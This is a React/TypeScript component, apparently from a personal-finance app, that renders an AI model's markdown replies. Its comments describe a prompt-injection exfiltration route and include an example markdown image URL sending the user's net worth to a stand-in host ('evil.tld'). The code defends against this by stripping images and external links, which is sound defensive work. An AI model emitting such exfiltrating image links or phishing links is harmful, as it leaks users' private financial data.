"use client";

import type { UIMessage } from "ai";
import { useRouter } from "next/navigation";
import type { ReactNode } from "react";
import { Streamdown } from "streamdown";

import { withoutPublicHoldingIds } from "./holding-id-prose";
import { internalProseLinkHref } from "./prose-link";

/**
 * Assistant replies arrive as markdown (bold, lists, headings, tables, code)
 * over an AI SDK stream, so we render them with streamdown (#1047): it closes
 * unclosed markdown mid-stream (half-typed bold, open code fences) without
 * thrashing the layout. The repo has no Tailwind, so streamdown's utility
 * classes are inert — the visual styling lives in globals.css scoped under
 * `.assistantMarkdown`, drawn from design-system tokens.
 *
 * `controls={false}` drops streamdown's copy/download chrome (unstyled here)
 * and leaves plain semantic HTML for our stylesheet to dress.
 */
function AssistantMarkdown({ children }: { children: string }) {
  return (
    <div className="assistantMarkdown">
      <Streamdown components={ASSISTANT_MARKDOWN_COMPONENTS} controls={false}>
        {children}
      </Streamdown>
    </div>
  );
}

/**
 * The assistant renders NO images, ever (#1246 security review).
 *
 * A remote `<img src>` is an outbound GET the browser makes with no click, so a
 * markdown image in the reply is a data-egress channel: a successful prompt
 * injection — from an attachment the user was sent and forwarded, from a
 * spreadsheet grid (#865), from any untrusted text a tool returns — can end its
 * answer with `![](https://evil.tld/p.png?d=<net worth>)` and the pixels leave the
 * page on their own. streamdown's default `allowedImagePrefixes` is `["*"]`, and
 * the deployed CSP is served in report-only mode, so nothing downstream stops it.
 *
 * Dropping the element is the whole fix, and it costs nothing real: the assistant
 * answers in prose, figures and links to worthline's own surfaces — it has never
 * had a reason to paint an image. This is a narrow, verifiable rule, not a
 * sanitizer to keep correct: there is no allowlist to get wrong, and the alt text
 * still reads, so an injected image cannot even hide its own body.
 *
 * Two notes that were true when this was written and are not any more. The CSP is
 * no longer report-only: `img-src` and `connect-src` enforce since #1256 — this rule
 * is now the first of two layers rather than the only one. And «prose and links are
 * untouched» stopped being true with {@link ProseLink} (#1289).
 */
const ASSISTANT_MARKDOWN_COMPONENTS = {
  a: ProseLink,
  img: ({ alt }: { alt?: string | undefined }) => <>{alt ?? ""}</>,
} as const;

/**
 * A link in the assistant's prose survives only if it points at worthline (#1289).
 *
 * The sibling of the no-images rule, and the same shape: an internal route keeps
 * working, everything else keeps its TEXT and loses its href. The reasoning behind
 * the two differs, though, and the difference is worth writing down — #1246 accepted
 * links precisely because «a click is not a silent GET», which answers exfiltration
 * without a click and says nothing about phishing. An injected turn could write a
 * clickable link to any host inside worthline's own panel, and streamdown's pipeline
 * allows every prefix and every protocol; its `linkSafety` modal is an English «are
 * you sure», which is not a boundary. See {@link internalProseLinkHref} for what
 * «internal» has to mean.
 *
 * The internal case also stops being second-class: `router.push` is what the typed
 * chip does (ADR 0053), so the panel — mounted in the root layout — survives the
 * navigation. Until now streamdown handed even `/patrimonio` to
 * `window.open(_blank)`, which opened a second tab and called worthline an external
 * website on the way. The `data-streamdown="link"` hook is kept deliberately: the
 * styling in `globals.css` is written against that attribute and both channels
 * should look alike.
 */
function ProseLink({
  children,
  href,
}: {
  children?: ReactNode;
  href?: string | undefined;
}) {
  const router = useRouter();
  const internalHref = internalProseLinkHref(href);
  if (internalHref === null) return <>{children}</>;
  return (
    <a
      data-streamdown="link"
      href={internalHref}
      onClick={(event) => {
        event.preventDefault();
        router.push(internalHref);
      }}
    >
      {children}
    </a>
  );
}

/**
 * One text part of a chat turn. The assistant's prose is rendered as markdown;
 * the user's turn stays literal text in its marginalia paragraph — we never
 * reinterpret what the user typed as markup (#1047).
 *
 * The assistant's prose also never shows a public holding id (#1263): it is
 * machinery, it says nothing to the reader, and printing it is how an invented id
 * reached the user dressed as a verified fact. `holdingLabels` names the ones this
 * conversation read; the rest become a neutral marker. Sibling of the no-images
 * rule above — narrow, verifiable, and applied to the assistant only.
 */
export function AssistantTextPart({
  role,
  text,
  holdingLabels,
}: {
  role: UIMessage["role"];
  text: string;
  holdingLabels?: ReadonlyMap<string, string>;
}) {
  if (role === "assistant") {
    return (
      <AssistantMarkdown>
        {withoutPublicHoldingIds(text, holdingLabels ?? EMPTY_HOLDING_LABELS)}
      </AssistantMarkdown>
    );
  }
  return <p>{text}</p>;
}

const EMPTY_HOLDING_LABELS: ReadonlyMap<string, string> = new Map();
